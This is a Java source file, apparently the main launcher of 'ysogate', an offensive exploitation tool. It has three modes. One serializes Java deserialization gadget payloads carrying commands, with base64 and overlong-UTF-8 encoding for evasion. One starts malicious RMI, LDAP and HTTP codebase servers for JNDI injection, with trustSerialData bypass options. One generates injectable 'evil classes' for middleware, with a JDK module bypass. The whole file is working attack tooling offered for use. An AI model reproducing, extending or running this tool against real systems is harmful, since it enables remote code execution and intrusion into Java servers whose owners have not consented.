package com.h2tg.ysogate;

import java.io.*;
import java.sql.SQLOutput;
import java.util.*;
import java.util.stream.Collectors;

import com.h2tg.ysogate.config.Config;
import com.h2tg.ysogate.config.GenConfig;
import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.exploit.server.LDAPServer;
import com.h2tg.ysogate.exploit.server.RMIServer;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.h2tg.ysogate.utils.CtClassUtils;
import javassist.*;
import javassist.bytecode.AccessFlag;
import org.apache.commons.cli.*;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.payloads.CommandObjectPayload.Utils;
import org.apache.commons.codec.binary.Base64OutputStream;
import com.h2tg.ysogate.annotation.Dependencies;
import org.reflections.Reflections;
import org.reflections.scanners.Scanners;
import org.reflections.util.ClasspathHelper;
import org.reflections.util.ConfigurationBuilder;

import static com.h2tg.ysogate.utils.CtClassUtils.bypassJDKModuleBody;
import static com.h2tg.ysogate.utils.CtClassUtils.genEvilClass;

@SuppressWarnings("rawtypes")
public class Main
{

    private static final String PREFIX = "\u001B[32m[root]#~\u001B[0m  ";
    private static final String ERR_PREFIX = "\u001B[31m[root]#~\u001B[0m  ";
    private static CommandLine cmdLine;
    public static Object PAYLOAD = null;
    private static Options commonOptions;
    private static Options payloadOptions;
    private static Options jndiOptions;
    private static Options genOptions;

    public static void main(final String[] args)
    {
        initializeOptions();

        try {
            cmdLine = new DefaultParser().parse(commonOptions, args, true);

            if (cmdLine.hasOption("help") && !cmdLine.hasOption("mode")) {
                printUsage(null);
                return;
            }

            String mode = cmdLine.getOptionValue("mode");
            if (mode == null) {
                printUsage(null);
                throw new ParseException("Mode (-m) is required. Use 'payload' or 'jndi' or 'gen'.");
            }

            switch (mode.toLowerCase()) {
                case "payload":
                    handlePayloadMode(args);
                    break;
                case "jndi":
                    handleJNDIMode(args);
                    break;
                case "gen":
                    handleGenMode(args);
                    break;
                default:
                    printUsage(null);
                    throw new ParseException("Invalid mode. Use 'payload' or 'jndi' or 'gen'.");
            }
        } catch (ParseException e) {
            printError("Parameter input error: " + e.getMessage());
//            printUsage(null);
        }
    }

    private static void initializeOptions()
    {
        commonOptions = new Options()
                .addOption("m", "mode", true, "Operation mode: 'payload' or 'jndi' or 'gen'")
                .addOption("h", "help", false, "Show help message")
        ;

        payloadOptions = new Options()
                .addOption("g", "gadget", true, "Java deserialization gadget")
                .addOption("p", "parameters", true, "Gadget parameters")
                .addOption("f", "file", true, "Write Output into FileOutputStream (Specified FileName)")
                .addOption("b64", "base64", false, "Encode Output into base64")
                .addOption("ol", "overlong", false, "Use overlong UTF-8 encoding")
        ;

        jndiOptions = new Options()
                .addOption("i", "ip", true, "IP address for JNDI server")
                .addOption("rp", "rmiPort", true, "RMI port")
                .addOption("lp", "ldapPort", true, "LDAP port")
                .addOption("hp", "httpPort", true, "HTTP port")
                .addOption("onlyRef", false, "use Reference only to bypass trustSerialData")
                .addOption("ldap2rmi", false, "change ldap to rmi to bypass trustSerialData")
//                .addOption("u", "url", true, "URL for JNDI resource")
        ;

        genOptions = new Options()
                .addOption("t", "type", true, "Middleware type")
                .addOption("s", "sink", true, "Evil sink template")
                .addOption("f", "format", true, "Output format")
                .addOption("name", "classname", true, "Evil Class Name")
                .addOption("bypass", false, "ByPass JDK Module")
        ;

        // Add common options to both payload and JNDI options
        for (Option opt : commonOptions.getOptions()) {
            payloadOptions.addOption(opt);
            jndiOptions.addOption(opt);
            genOptions.addOption(opt);
        }
    }

    private static void handlePayloadMode(String[] args) throws ParseException
    {
        cmdLine = new DefaultParser().parse(payloadOptions, args);

        if (cmdLine.hasOption("help")) {
            printUsage(payloadOptions);
            return;
        }

        if (!cmdLine.hasOption("gadget") || !cmdLine.hasOption("parameters")) {
            printUsage(payloadOptions);
            throw new ParseException("Payload mode requires -g and -p options.");
        }

        Config.WRITE_FILE = cmdLine.hasOption("file");
        Config.FILE = cmdLine.getOptionValue("file");
        Config.BASE64_ENCODE = cmdLine.hasOption("base64");
        Config.USE_OVERLONG = cmdLine.hasOption("overlong");

        generatePayload(cmdLine.getOptionValue("gadget"), cmdLine.getOptionValue("parameters"));
    }

    private static void handleJNDIMode(String[] args) throws ParseException
    {
        cmdLine = new DefaultParser().parse(jndiOptions, args);

        if (cmdLine.hasOption("help")) {
            printUsage(jndiOptions);
            return;
        }

//        String[] requiredOpts = {"ip"};
//        for (String opt : requiredOpts) {
//            if (!cmdLine.hasOption(opt)) {
//                printUsage(jndiOptions);
//                throw new ParseException("JNDI mode requires -i options.");
//            }
//        }

        printInfo("Starting JNDI server...");
        // TODO: Implement JNDI server startup logic
        String ip = cmdLine.getOptionValue("ip") == null ? JndiConfig.ip : cmdLine.getOptionValue("ip");
        int rmiPort = cmdLine.getOptionValue("rp") == null ? JndiConfig.rmiPort : Integer.parseInt(cmdLine.getOptionValue("rp"));
        int ldapPort = cmdLine.getOptionValue("lp") == null ? JndiConfig.ldapPort : Integer.parseInt(cmdLine.getOptionValue("lp"));
        int httpPort = cmdLine.getOptionValue("hp") == null ? JndiConfig.httpPort : Integer.parseInt(cmdLine.getOptionValue("hp"));
        JndiConfig.codebase = "http://" + ip + ":" + httpPort + "/";
        JndiConfig.ldap2rmi = cmdLine.hasOption("ldap2rmi");
        JndiConfig.onlyRef = cmdLine.hasOption("onlyRef");

//        printInfo("JNDI Server IP: " + ip);
//        printInfo("RMI Port: " + rmiPort);
//        printInfo("LDAP Port: " + ldapPort);
//        printInfo("HTTP Port: " + httpPort);

        RMIServer rmiServer = new RMIServer(ip, rmiPort);
        LDAPServer ldapServer = new LDAPServer(ip, ldapPort);
        WebServer webServer = new WebServer(ip, httpPort);

        Thread rmiThread = new Thread(rmiServer);
        Thread ldapThread = new Thread(ldapServer);
        Thread webThread = new Thread(webServer);

        rmiThread.start();
        ldapThread.start();
        webThread.start();
    }

    private static void handleGenMode(String[] args) throws ParseException
    {
        cmdLine = new DefaultParser().parse(genOptions, args);
        if (cmdLine.hasOption("help")) {
            printUsage(genOptions);
            return;
        }
//        showTemplates();

        if (!cmdLine.hasOption("sink") || !cmdLine.hasOption("type")) {
            printUsage(genOptions);
            showTemplates();
            throw new ParseException("Gen mode requires -t and -s options to specify middleware type and evil sink template.");
        }

        String format = cmdLine.getOptionValue("format") == null ? GenConfig.formatType : cmdLine.getOptionValue("format");
        String className = cmdLine.getOptionValue("classname") == null ? GenConfig.className : cmdLine.getOptionValue("classname");
        GenConfig.bypassModule = cmdLine.hasOption("bypass");

        if (GenConfig.bypassModule && !className.startsWith("org.springframework.expression")) {
            printError("Class name must start with 'org.springframework.expression' to bypass JDK module.");
            return;
        }
        byte[] clazzbytes = genEvilClass(className, cmdLine.getOptionValue("type"), cmdLine.getOptionValue("sink"));

        String result = null;
        if (format.equals("base64")) {
            result = Base64.getEncoder().encodeToString(clazzbytes);
        }

        System.out.println("Evil Class Name: " + className);
        System.out.println(result);
        System.out.println("Evil Class Length: " + clazzbytes.length);
        System.out.println("Request Header Name: " + GenConfig.reqHeaderName);

    }

    private static void generatePayload(String payloadType, String parameters)
    {
        try {
            final Class<? extends CommandObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
            if (payloadClass == null) {
                throw new IllegalArgumentException("Invalid payload type '" + payloadType + "'");
            }

            CommandObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(parameters);

            PAYLOAD = object;
            if (Strings.isFromExploit()) {
                return;
            }

            try (OutputStream out = getOutputStream()) {
                if (Config.USE_OVERLONG) {
                    Serializer.overlongSerialize(object, out);
                } else {
                    Serializer.serialize(object, out);
                }
                Utils.releasePayload(payload, object);
            }
        } catch (Exception e) {
            printError("Error while generating or serializing payload: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static OutputStream getOutputStream() throws Exception
    {
        if (Config.WRITE_FILE) {
            return new FileOutputStream(Config.FILE);
        } else if (Config.BASE64_ENCODE) {
            return new Base64OutputStream(System.out, true, -1, null);
        } else {
            return System.out;
        }
    }

    private static void printUsage(Options options)
    {
        HelpFormatter formatter = new HelpFormatter();
        formatter.setWidth(100);

        printInfo("H4cking to the Gate !");
        printInfo("Usage:");
        printInfo("Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]");
        printInfo("JNDI    Mode: java -jar ysogate-[version]-all.jar -m jndi    [JNDI OPTIONS]");
        printInfo("Gen     Mode: java -jar ysogate-[version]-all.jar -m gen     [GEN OPTIONS]");
        System.out.println();

        if (options == null) {
            printInfo("Common Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), commonOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
            printInfo("For mode-specific options, please specify a mode (-m payload or -m jndi) and use -h");
        } else if (options == payloadOptions) {
            printInfo("Payload Mode Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), payloadOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
            showPayloads();
        } else if (options == jndiOptions) {
            printInfo("JNDI Mode Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), jndiOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
        } else if (options == genOptions) {
            printInfo("Gen Mode Options:");
            formatter.printOptions(new PrintWriter(System.out, true), formatter.getWidth(), genOptions,
                    formatter.getLeftPadding(), formatter.getDescPadding());
        }
    }

    public static void printInfo(String message)
    {
        System.out.println(PREFIX + message);
    }

    private static void printError(String message)
    {
        System.err.println(ERR_PREFIX + "Error: " + message);
    }

    private static void showPayloads()
    {
        System.out.println("\r\n");
        System.out.println(PREFIX + "Available payload types:");
        final List<Class<? extends CommandObjectPayload>> payloadClasses = new ArrayList<>(Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<>();
        rows.add(new String[]{"Payload", "Dependencies"});
        rows.add(new String[]{"-------", "------------"});
        for (Class<? extends CommandObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                    payloadClass.getSimpleName(),
//                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.out.println("     " + line);
        }

        System.err.println("\r\n");
    }

    public static void showTemplates()
    {
        Reflections reflections = new Reflections("com.h2tg.ysogate.template"); // Scanners.TypesAnnotated 扫描所有类型的类
        Set<Class<?>> classes = reflections.getSubTypesOf(Object.class);
        System.out.println("Available templates:");
        for (Class<?> clazz : classes) {
            System.out.println("    " + clazz.getSimpleName());
        }
    }
}